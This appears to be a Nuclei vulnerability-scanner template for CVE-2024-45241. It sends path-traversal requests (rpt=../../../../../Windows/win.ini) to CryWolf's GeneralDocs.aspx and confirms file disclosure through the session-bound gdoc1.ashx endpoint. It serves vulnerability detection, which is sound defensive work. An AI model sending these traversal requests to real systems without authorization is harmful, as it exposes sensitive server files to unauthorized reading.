id: CVE-2024-45241

info:
  name: A path traversal vulnerability in the CryWolf (False Alarm Management) application.
  author: kaks3c
  severity: high
  description: |
    A traversal vulnerability in GeneralDocs.aspx in CentralSquare CryWolf (False Alarm Management) through 2024-08-09 allows unauthenticated attackers to read files outside of the working web directory via the rpt parameter, leading to the disclosure of sensitive information.

flow: |
  http(1) && http(2) && http(3) && http(4)

http:
  - method: GET
    path:
      - "{{BaseURL}}/GeneralDocs.aspx?rpt=../../../../../Windows/win.ini"

    extractors:
      - type: regex
        name: session_id
        part: header
        group: 1
        internal: true
        regex:
          - 'Set-Cookie:\s*ASP.NET_SessionId=(.*?);'

  - raw:
      - |
        GET /gdoc1.ashx HTTP/1.1
        Host: {{Hostname}}
        Cookie: ASP.NET_SessionId={{session_id}};

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "\\[(font|extension|file)s\\]"

    extractors:
      - type: dsl
        dsl:
          - 'session_id'

  - raw:
      - |
        GET /GeneralDocs.aspx?rpt=../../../../../Windows/win.ini HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: session_id_2
        part: header
        group: 1
        internal: true
        regex:
          - 'Set-Cookie:\s*ASP.NET_SessionId=(.*?);'

  - raw:
      - |
        GET /gdoc1.ashx HTTP/1.1
        Host: {{Hostname}}
        Cookie: ASP.NET_SessionId={{session_id_2}};

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "\\[(font|extension|file)s\\]"

    extractors:
      - type: dsl
        dsl:
          - 'session_id_2'
